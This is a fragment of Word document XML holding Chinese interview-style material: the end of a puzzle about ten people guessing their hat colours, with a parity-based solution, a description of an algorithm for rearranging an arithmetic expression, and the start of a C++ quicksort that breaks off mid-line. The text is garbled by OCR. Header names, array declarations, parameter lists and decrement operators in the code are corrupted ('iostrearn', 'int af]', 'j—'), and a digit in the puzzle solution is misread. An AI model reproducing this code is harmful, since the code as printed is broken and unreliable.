          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>上的帽</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>子的颜色是白色还是黑色，如果答对了，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>就放</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>他走； 如果答错了，就被杀掉。然后同样问排在第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>位的人，然后 问排在第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>位的人，.…以此类推。在这其中，</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个人所能做 的只有当他被魔鬼</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>问到的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>时候，答白色或者黑色。不能有超 越此范围的任何</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>行动，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>不然，魔鬼会把它们</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个人全部杀 死。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="607" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>现在魔鬼给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>他们</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个人一晚上的时间去商量一个对策，使 得</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>他们中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>能存活</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>下来的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>人越多越好。请问，你</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>会有什</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>么样的 对策，请计算出按</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>照你的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>对策执行时最</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">坏的情况下，他们中 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>能有多少人能</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>100%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>够活</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>下来？</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>期望能活下来的人数又是多 少？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>大家约定白代表偶，黑代表奇，则第10个人的回答是前9个帽子中白帽的数量的奇偶。 他自己有50%的机会。-第9个人听到他的回答后，结合他看到的8顶帽子中白帽的奇 偶，可以知道自己的帽子的颜色，如实作答。第8个人知道9顶帽子中白帽的奇偶，加 上听到第9顶帽子的颜-色,就可以知道前8顶帽子中白帽的奇偶(如果第9个人答白, 则前8顶中的白帽奇偶性与第第10个人所说的相反；如果第9个人答黑，则相同)，再 结合所看到前7顶-帽子中的白帽数量，也可以推出自己的帽子颜色，也如实作答。依 此类推，前9个人都可以活下来，第1。个人有一半机会。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="220" w:line="645" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="199" w:name="bookmark210"/>
      <w:bookmarkEnd w:id="199"/>
      <w:bookmarkStart w:id="200" w:name="bookmark209"/>
      <w:bookmarkStart w:id="201" w:name="bookmark211"/>
      <w:bookmarkStart w:id="202" w:name="bookmark208"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>遍历输入流，将符号和数字分开存到两个数组里，减号 作为数字的负数。</w:t>
      </w:r>
      <w:bookmarkEnd w:id="200"/>
      <w:bookmarkEnd w:id="201"/>
      <w:bookmarkEnd w:id="202"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="637" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="203" w:name="bookmark214"/>
      <w:bookmarkStart w:id="204" w:name="bookmark212"/>
      <w:bookmarkStart w:id="205" w:name="bookmark213"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>然后在符号集里面找</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>或者/,找到就把对应的数组集两个操</w:t>
      </w:r>
      <w:bookmarkEnd w:id="203"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="220" w:line="637" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="206" w:name="bookmark215"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>作数比较并排序。</w:t>
      </w:r>
      <w:bookmarkEnd w:id="204"/>
      <w:bookmarkEnd w:id="205"/>
      <w:bookmarkEnd w:id="206"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="637" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="207" w:name="bookmark218"/>
      <w:bookmarkStart w:id="208" w:name="bookmark216"/>
      <w:bookmarkStart w:id="209" w:name="bookmark217"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>然后数组被分割成三段，中间是乘法和两个交换数，两边是</w:t>
      </w:r>
      <w:bookmarkEnd w:id="207"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="220" w:line="637" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="210" w:name="bookmark219"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>没有操作的数据，然后分别对两边做递归。</w:t>
      </w:r>
      <w:bookmarkEnd w:id="208"/>
      <w:bookmarkEnd w:id="209"/>
      <w:bookmarkEnd w:id="210"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="630" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="211" w:name="bookmark220"/>
      <w:bookmarkStart w:id="212" w:name="bookmark221"/>
      <w:bookmarkStart w:id="213" w:name="bookmark222"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>如果没有找到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>或者/说明全是加法，直接对数组的数据进行 排序。</w:t>
      </w:r>
      <w:bookmarkEnd w:id="211"/>
      <w:bookmarkEnd w:id="212"/>
      <w:bookmarkEnd w:id="213"/>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">include </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>iostrearn〉</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include 〈vector〉</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include〈math. h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="48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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>林</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1 + 2 + 1+-4 *-5 + 1</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1 + 1 + 2 +-5 *-4 + 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="6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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int data[100];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>char fuhao L100J;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>林</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="600"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>快排序</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="890"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="600"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="214" w:name="bookmark223"/>
      <w:bookmarkEnd w:id="214"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>©param a</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="890"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="600"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="215" w:name="bookmark224"/>
      <w:bookmarkEnd w:id="215"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>©param low</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="890"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="600"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="216" w:name="bookmark225"/>
      <w:bookmarkEnd w:id="216"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>©param high</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="6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220" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void quicksort (int af], int low , in,: high)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="840"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (low&lt;high)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int i = low, j = high;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int x = a[low];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while(i〈j)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while(i&lt;j &amp;&amp; a[j] &gt;= x) j—; if(i&lt;j) a[i++] = a[j];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while(i&lt;j &amp;&amp; a[i] &lt;= x) i++; if(i&lt;j) a[j—] = a[i]；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>a[i] = x;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="960" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>quicksort (a, low , i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
